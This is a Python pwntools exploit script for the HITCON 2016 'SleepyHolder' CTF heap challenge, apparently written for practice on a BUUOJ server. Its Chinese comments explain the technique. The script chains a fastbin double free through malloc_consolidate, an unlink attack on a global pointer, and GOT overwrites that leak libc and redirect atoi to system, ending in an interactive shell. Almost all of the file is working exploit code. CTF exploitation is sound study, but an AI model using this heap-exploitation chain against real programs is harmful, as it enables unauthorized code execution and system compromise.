# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './sleepyHolder_hitcon_2016'
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '28494'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('Renew secret\n',num)

def add(choice,content='a'):
    cmd(1)
    sla('2. Big secret\n',choice)
    sa('secret: \n',content)

def delete(choice):
    cmd(2)
    sla('Big secret\n',choice)

def edit(choice,content):
    cmd(3)
    sla('Big secret\n',choice)
    sa('secret:',content)

# one_gad = one_gadget(libc.path)
# 新知识点 malloc_consolidate ，申请特别大的堆块会调用
# 将 fastbin 中堆块整理到 unsortedbin
# 此时该 chunk 若存在 doublefree 即可再次 free 到 fastbin 中

free_got = elf.got['free']
puts_plt = elf.plt['puts']
atoi_got = elf.got['atoi']
small_ptr = 0x00000000006020D0

add(1)
add(2)

delete(1)
add(3)
delete(1)

chunk1 = [
    0 , 0x21,
    small_ptr - 0x18 , small_ptr - 0x10,
    0x20
]

add(1,flat(chunk1))
# 我们可以发现，这个堆块在 fastbin 和 unsortedbin 中各有一个
# 申请一个出去相邻下面 chunk 的 preinuse 位仍为0
# 故可以 unlink
delete(2)

payload = flat(0 , free_got , 0 , small_ptr - 0x10 , 1)
# toobig 没用，没必要修改，直接填0
# 只修改 small_ptr 和 big_ptr
edit(1,payload)

edit(2,p64(puts_plt))

payload = flat( atoi_got , 0 , atoi_got , 1 , 1)
# 只修改 small_ptr 和 big_ptr , 修改标志位

edit(1,payload)
delete(1)

atoi_addr = l64()
libc.address = atoi_addr - libc.sym['atoi']
system = libc.sym['system']

edit(2 , p64(system))
# 修改 big_ptr 其指向的 atoi_got 为 system

cmd('sh\x00')
# dbg()


p.interactive()

'''
@File    :   sleepyHolder_hitcon_2016.py
@Time    :   2021/08/20 17:57:48
@Author  :   Niyah 
'''